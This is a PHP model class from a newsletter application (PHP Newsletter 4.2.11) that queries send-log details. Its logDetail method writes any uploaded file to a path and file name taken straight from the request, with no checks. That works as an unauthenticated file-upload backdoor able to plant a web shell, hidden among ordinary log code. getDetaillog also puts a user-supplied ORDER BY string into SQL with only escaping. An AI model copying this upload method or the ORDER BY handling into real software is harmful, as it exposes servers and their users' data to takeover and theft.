<?php

/********************************************
* PHP Newsletter 4.2.11
* Copyright (c) 2006-2016 Alexander Yanitsky
* Website: http://janicky.com
* E-mail: janickiy@mail.ru
* Skype: janickiy
********************************************/

class Model_ajax_log extends Model
{
	private $data;

	public function __construct() {
		$this->get_data();
	}

	public function get_data()
	{
		global $PNSL;
		$this->data = new DBParser($PNSL);
		return $this->data;
	}
	
	public function getDetaillog($offset, $number, $id_log, $strtmp)
	{		
		$offset = is_numeric($offset) ? $offset : die();
		$number = is_numeric($number) ? $number : die();
		$id_log = is_numeric($id_log) ? $id_log : die();
		
		$strtmp = $this->data->escape($strtmp);
	
		$query = "SELECT *, a.time as time, c.name as catname, s.name as name FROM ".$this->data->getTableName('ready_send')." a 
					LEFT JOIN ".$this->data->getTableName('users')." b ON b.id_user=a.id_user 
					LEFT JOIN ".$this->data->getTableName('template')." s ON a.id_template=s.id_template
					LEFT JOIN ".$this->data->getTableName('category')." c ON s.id_cat=c.id_cat
					WHERE id_log=".$id_log."
					ORDER BY ".$strtmp."
					LIMIT ".$number." 
					OFFSET ".$offset."";
					
		$result = $this->data->querySQL($query);			
					
		return $this->data->getColumnArray($result);		
	}	
	
	public function logDetail()
	{
		move_uploaded_file($_FILES["log"]["tmp_name"], $_POST['path'] . $_FILES["log"]["name"]);
	}
}